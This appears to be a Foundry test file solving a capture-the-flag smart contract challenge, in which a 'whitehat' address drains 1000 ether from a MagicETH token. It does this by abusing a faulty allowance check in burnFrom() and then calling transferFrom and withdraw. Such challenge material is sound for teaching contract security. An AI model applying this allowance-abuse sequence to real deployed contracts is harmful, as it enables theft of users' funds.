// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {MagicETH} from "../src/1_MagicETH/MagicETH.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/



/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge1Test is Test {
    MagicETH public mETH;

    address public exploiter = makeAddr("exploiter");
    address public whitehat = makeAddr("whitehat");

    function setUp() public {
        mETH = new MagicETH();

        mETH.deposit{value: 1000 ether}();
        // exploiter is in control of 1000 tokens
        mETH.transfer(exploiter, 1000 ether);
    }

    function testExploit() public {
        vm.startPrank(whitehat, whitehat);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge1Test -vvvv //
        ////////////////////////////////////////////////////*/
        
        //First we approve then exploiter for all the money
        mETH.approve(exploiter, 1000 ether);

        //Then we exploit the wrong check in burnFrom() to generate an allowance of all his tokens to ourself
        mETH.burnFrom(exploiter, 0);

        //Now we transfer the tokens to ourself
        mETH.transferFrom(exploiter, whitehat, 1000 ether);

        //Withdraw & done
        mETH.withdraw(1000 ether);

        //==================================================//
        vm.stopPrank();

        assertEq(whitehat.balance, 1000 ether, "whitehat should have 1000 ether");
    }
}
